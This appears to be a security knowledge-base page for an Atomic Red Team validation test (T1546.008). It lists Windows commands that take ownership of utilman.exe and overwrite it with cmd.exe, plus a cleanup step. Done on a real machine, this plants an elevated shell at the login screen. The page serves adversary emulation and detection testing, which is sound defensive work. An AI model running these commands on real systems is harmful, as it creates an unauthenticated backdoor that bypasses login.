---
atomic_guid: "1db380da-3422-481d-a3c8-6d5770dba580"
title: "Replace utilman.exe (Ease of Access Binary) with cmd.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "1db380da-3422-481d-a3c8-6d5770dba580"
  - "Replace utilman.exe (Ease of Access Binary) with cmd.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Replace utilman.exe (Ease of Access Binary) with cmd.exe

Replace utilman.exe (Ease of Access binary) with cmd.exe. This allows the user to launch an elevated command prompt by clicking the Ease of Access button on the login screen.

## Metadata

- Atomic GUID: 1db380da-3422-481d-a3c8-6d5770dba580
- Technique: T1546.008: Event Triggered Execution: Accessibility Features
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1546.008/T1546.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.008]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\utilman.exe /A
icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

### Cleanup

```commandprompt
copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
